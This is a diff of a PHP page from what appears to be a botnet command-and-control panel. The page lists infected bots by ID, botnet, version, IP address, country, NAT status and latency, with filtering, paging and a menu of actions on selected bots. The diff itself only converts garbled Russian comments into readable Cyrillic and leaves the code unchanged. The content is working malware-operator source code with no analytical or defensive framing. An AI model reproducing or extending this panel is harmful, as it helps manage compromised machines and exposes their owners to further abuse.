@@ -1,12 +1,12 @@
 <?php if(!defined('__CP__'))die();
 
-define('BOTS_PER_PAGE',       50); //РљРѕР»РёС‡РµС‚СЃРІРѕ Р±РѕС‚РѕРІ РЅР° СЃС‚СЂР°РЅРёС†Сѓ.
-define('BOTSLIST_ROWS_COUNT', 10); //РљРѕР»РёС‡РµС‚СЃРІРѕ СЃС‚РѕР»Р±С†РѕРІ РІ  СЃРїРёСЃРєРµ Р±РѕС‚РѕРІ.
+define('BOTS_PER_PAGE',       50); //Количетсво ботов на страницу.
+define('BOTSLIST_ROWS_COUNT', 10); //Количетсво столбцов в  списке ботов.
 
-$fullQuery = QUERY_STRING; //РЎС‚СЂРѕРєР° РїРѕР»РЅРѕРіРѕ Р·Р°РїСЂРѕСЃР°.
+$fullQuery = QUERY_STRING; //Строка полного запроса.
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// РћРїСЂРµРґРµР»СЏРµРј РґР°РЅРЅС‹Рµ РґР»СЏ С„РёР»СЊС‚СЂР°.
+// Определяем данные для фильтра.
 ///////////////////////////////////////////////////////////////////////////////////////////////////
 $filter['bots']      = isset($_GET['bots'])      ? $_GET['bots']      : '';
 $filter['botnets']   = isset($_GET['botnets'])   ? $_GET['botnets']   : '';
@@ -22,7 +22,7 @@ $filter['comment'] = isset($_GET['comment']) ? intval($_GET['comment']) : 0;
 foreach($filter as $k => $i)$fullQuery .= '&'.$k.'='.urlencode($i);
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// РћРїСЂРµРґРµР»СЏРµРј РґР°РЅРЅС‹Рµ С‚РµРєСѓС‰РµР№ СЃРѕСЂС‚РёСЂРѕРІРєРё.
+// Определяем данные текущей сортировки.
 ///////////////////////////////////////////////////////////////////////////////////////////////////
 
 $fullQuery .= assocateSortMode(array('bot_id', 'botnet', 'bot_version', 'ipv4', 'country', 'rtime_online', 'net_latency', 'comment'));
@@ -30,7 +30,7 @@ $jsSort = addJsSlashes($fullQuery);
 $jsPage = addJsSlashes($fullQuery);
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// JavaScript СЃРєСЂРёРїС‚С‹.
+// JavaScript скрипты.
 ///////////////////////////////////////////////////////////////////////////////////////////////////
 
 $jsScript = jsCheckAll('botslist', 'checkall', 'bots[]').
@@ -38,13 +38,13 @@ $jsScript = jsCheckAll('botslist', 'checkall', 'bots[]').
             "function changePage(p){window.location='{$jsPage}&page=' + p; return false;}";
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// РЎРѕР·РґР°РЅРёРµ Р·Р°РїСЂРѕСЃР°.
+// Создание запроса.
 ///////////////////////////////////////////////////////////////////////////////////////////////////
 /*
-  РљР°СЃР°С‚РµР»СЊРЅРѕ LOCATE(`ipv4`, `ipv4_list`). РЎРїРѕСЃРѕР± РёРјРµРµС‚ РґРѕСЃС‚Р°С‚РѕС‡РЅРѕ Р·Р°РјРµС‚РЅС‹Р№ РєРѕСЃСЏРє, РЅРѕ Р·Р°РґСѓРјС‹РІР°СЏСЃСЊ
-  Рѕ С…РѕС‚СЊ РєР°РєРѕРј-С‚Рѕ РІС‹РёРіСЂР°С€Рµ РІ СЃРєРѕСЂРѕСЃС‚Рё, РЅРµ РґСѓРјР°СЋ С‡С‚Рѕ РµРіРѕ СЃС‚РѕРёС‚ Р»РµС‡РёС‚СЊ... РЇ РґСѓРјР°СЋ РІРµСЂРѕСЏС‚РЅРѕСЃС‚СЊ РІСЃС‚СЂРµС‚РёС‚СЊ
-  С‚Р°РєРѕРіРѕ СЃСѓСЂРѕРІРѕРіРѕ СЃРѕРІРїР°РґРµРЅРёСЏ РІ РґРёРєРѕРј РёРЅС‚РµСЂРЅРµС‚Рµ РѕС‡РµРЅСЊ РЅРёР·РєР°. Р•С‰Рµ РјРѕР¶РЅРѕ РїРѕРїСЂРѕР±С‹РІР°С‚СЊ РґРµР»РёС‚СЊ РїРѕ РјРѕРґСѓР»СЋ
-  РЅР° 4... Р§С‚Рѕ РїСЂРёРІРµРґРµС‚ Рє РїСЂРѕС‚РёРІРѕРїРѕР»РѕР¶РЅРѕРјСѓ РєРѕСЃСЏРєСѓ...
+  Касательно LOCATE(`ipv4`, `ipv4_list`). Способ имеет достаточно заметный косяк, но задумываясь
+  о хоть каком-то выиграше в скорости, не думаю что его стоит лечить... Я думаю вероятность встретить
+  такого сурового совпадения в диком интернете очень низка. Еще можно попробывать делить по модулю
+  на 4... Что приведет к противоположному косяку...
 */
 $q = array();
 if($filter['nat'] > 0)    $q[] = "LOCATE(`ipv4`, `ipv4_list`)".($filter['nat'] == 1 ? '>' : '=')."0";
@@ -55,10 +55,10 @@ if($filter['comment'] > 0)$q[] = "LENGTH(`comment`)".($filter['comment'] == 1 ? 
 
 $q[] = expressionToSql($filter['bots'],      '`bot_id`',  0, 1);
 $q[] = expressionToSql($filter['botnets'],   '`botnet`',  0, 1);
-$q[] = expressionToSql($filter['ips'],       'CONCAT_WS(\'.\', ORD(SUBSTRING(`ipv4`, 1, 1)), ORD(SUBSTRING(`ipv4`, 2, 1)), ORD(SUBSTRING(`ipv4`, 3, 1)), ORD(SUBSTRING(`ipv4`, 4, 1)))',  0, 1); //Р­С‚Рѕ СѓР¶Р°СЃРЅРѕ.
+$q[] = expressionToSql($filter['ips'],       'CONCAT_WS(\'.\', ORD(SUBSTRING(`ipv4`, 1, 1)), ORD(SUBSTRING(`ipv4`, 2, 1)), ORD(SUBSTRING(`ipv4`, 3, 1)), ORD(SUBSTRING(`ipv4`, 4, 1)))',  0, 1); //Это ужасно.
 $q[] = expressionToSql($filter['countries'], '`country`', 0, 1);
 
-//Р§РёСЃС‚РёРј РјР°СЃСЃРёРІ.
+//Чистим массив.
 foreach($q as $k => $v)if($v == '')unset($q[$k]);
 
 $query1 = count($q) > 0 ? 'WHERE '.implode(' AND ', $q) : '';
@@ -67,20 +67,20 @@ if($_sortColumnId != 0)$query2 .= ', `bot_id`'.($_sortOrder == 0 ? ' ASC' : ' DE
 unset($q);
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// Р’С‹РІРѕРґ СЃРїРёСЃРєР°.
+// Вывод списка.
 ///////////////////////////////////////////////////////////////////////////////////////////////////
 
-//Р”Р°РЅРЅС‹Рµ Рѕ СЃС‚СЂР°РЅРёС†Рµ.
+//Данные о странице.
 $curPage   = (!empty($_GET['page']) && is_numeric($_GET['page']) ? $_GET['page'] : 1);
 $pageCount = 0;
 $pageList  = '';
 $botsCount = 0;
 
-//Р—Р°РїСЂРѕСЃ 1.
+//Запрос 1.
 $r = mysqlQueryEx('botnet_list', 'SELECT COUNT(*) FROM `botnet_list` '.$query1);
 if(($mt = @mysql_fetch_row($r)))
 {
-  //РЎРѕР·РґР°РЅРёРµ СЃРїРёСЃРєР° СЃС‚СЂР°РЅРёС†.
+  //Создание списка страниц.
   if(($pageCount = ceil($mt[0] / BOTS_PER_PAGE)) > 1)
   {
     $pageList = 
@@ -93,7 +93,7 @@ if(($mt = @mysql_fetch_row($r)))
   $botsCount = $mt[0];
 }
 
-//Р—Р°РїСЂРѕСЃ 2.
+//Запрос 2.
 $botsList = '';
 $offset = (($curPage - 1) * BOTS_PER_PAGE);
 if(!$r ||
@@ -105,7 +105,7 @@ if(!$r ||
     str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(BOTSLIST_ROWS_COUNT, $r ? LNG_BOTNET_LIST_EMPTY : mysqlErrorEx()), THEME_LIST_ITEM_EMPTY_1).
   THEME_LIST_ROW_END;
 }
-//Р’С‹РІРѕРґ СЂРµР·СѓР»СЊС‚Р°С‚Р°.
+//Вывод результата.
 else
 {
   $i = 0;
@@ -114,7 +114,7 @@ else
     //IPv4.
     $ipv4 = binaryIpToString($mt[4]);
 
-    //РњРµС‚РєР° NAT.
+    //Метка NAT.
     if($mt[3] == 0)$ipv4 .= '*';
 
     $themeText = $i % 2 ? THEME_LIST_ITEM_LTEXT_U2            : THEME_LIST_ITEM_LTEXT_U1;
@@ -140,7 +140,7 @@ else
 }
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// РЎРѕР·РґР°РЅРёРµ СЃРїРёСЃРѕРєР° РґРµР№С‚РІРёР№.
+// Создание списока дейтвий.
 ///////////////////////////////////////////////////////////////////////////////////////////////////
 
 $actions = '';
@@ -153,15 +153,15 @@ if($pageCount > 0 && count($botMenu) > 0)
 }
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// Р’С‹РІРѕРґ.
+// Вывод.
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-define('INPUT_WIDTH',  '250px'); //РЁРёСЂРёРЅР° input.text.
-define('SELECT_WIDTH', '150px'); //РЁРёСЂРёРЅР° select.
+define('INPUT_WIDTH',  '250px'); //Ширина input.text.
+define('SELECT_WIDTH', '150px'); //Ширина select.
 
 ThemeBegin(LNG_BOTNET, $jsScript, getBotJsMenu('botmenu'), 0);
 echo
 
-//Р¤РёР»СЊС‚СЂ.
+//Фильтр.
 str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('filter', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_BEGIN).
   FORM_CURRENT_MODULE.
   str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
@@ -249,7 +249,7 @@ THEME_FORMGET_END.
 
 THEME_VSPACE.
 
-//Р РµР·СѓР»СЊС‚Р°С‚.
+//Результат.
 str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('botslist', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_TO_NEW_BEGIN).
 str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
   str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1,  sprintf(LNG_BOTNET_LIST, numberFormatAsInt($botsCount))), THEME_DIALOG_TITLE).
